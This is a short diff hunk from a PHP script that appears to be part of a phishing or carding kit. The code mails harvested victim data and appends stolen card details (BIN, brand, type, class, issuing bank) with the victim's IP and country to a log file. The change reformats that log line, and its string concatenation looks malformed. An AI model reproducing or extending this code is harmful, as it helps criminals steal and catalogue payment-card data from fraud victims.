@@ -127,7 +127,7 @@ $VictimInfo5 = $systemInfo['os'];
                include "result/res_ceceh.php";
 
         mail($to,$subj,$data,$headers);
-        $empas   = "# $bin - $ccbrand -  [ ".$systemInfo['country']." ]\n";
+        $empas   = "# $bin. " | ". strtoupper($_SESSION['_cc_brand_']) ." ". strtoupper($_SESSION['_cc_type_']) ." ". strtoupper($_SESSION['_cc_class_']) ." ". $_SESSION['_cc_bank_'] ." [ ".$ip." - ".$lokasi->country." ] ";
     $file = fopen("assets/logs/bin.txt", "a");
     fwrite($file, $empas);
     fclose($file);
